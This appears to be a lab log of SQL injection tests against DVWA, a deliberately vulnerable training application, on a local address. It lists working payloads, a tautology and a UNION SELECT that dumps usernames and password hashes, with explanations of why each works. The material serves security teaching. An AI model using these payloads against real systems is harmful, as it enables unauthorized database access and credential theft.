# SQL Injection Payload Log - DVWA (Low Security)

Target: DVWA SQL Injection module (10.0.0.3/dvwa/vulnerabilities/sqli/)
Security level: Low

## Test 1: Normal input
Payload: 1
Result: Returned a single user (ID 1, admin, admin).
This is the expected, intended behaviour of the form.

## Test 2: ' OR '1'='1
Payload: ' OR '1'='1
Result: Returned all 5 users in the table (admin, Gordon Brown, Hack Me,
Pablo Picasso, Bob Smith), instead of just one.

Why it works: the backend query is built by directly inserting the
input into a string, roughly:
  SELECT first_name, last_name FROM users WHERE user_id = '$id'
Our payload turns this into:
  SELECT first_name, last_name FROM users WHERE user_id = '' OR '1'='1'
Since '1'='1' is always true, the WHERE clause matches every row,
so the query returns the whole table instead of one user.

## Test 3: ' UNION SELECT user, password FROM users-- -
Payload: ' UNION SELECT user, password FROM users-- -
Result: Returned usernames and MD5 password hashes from the internal
users table (admin, gordonb, 1337, pablo, smithy), a table the form
was never designed to expose.

Why it works: UNION SELECT lets an attacker attach the results of a
second, attacker-chosen query to the original one, as long as the
column counts match. The -- - comments out the rest of the original
query so it doesn't cause a syntax error. This is more dangerous than
Test 2, because it lets an attacker pull data from any table they can
guess the name and structure of, not just the one the form queries.

## Data exposed
- Full list of registered users (names, IDs)
- Usernames and password hashes for every DVWA account

## Severity
Critical. An attacker with no valid login could read the entire user
table and obtain password hashes to crack offline.
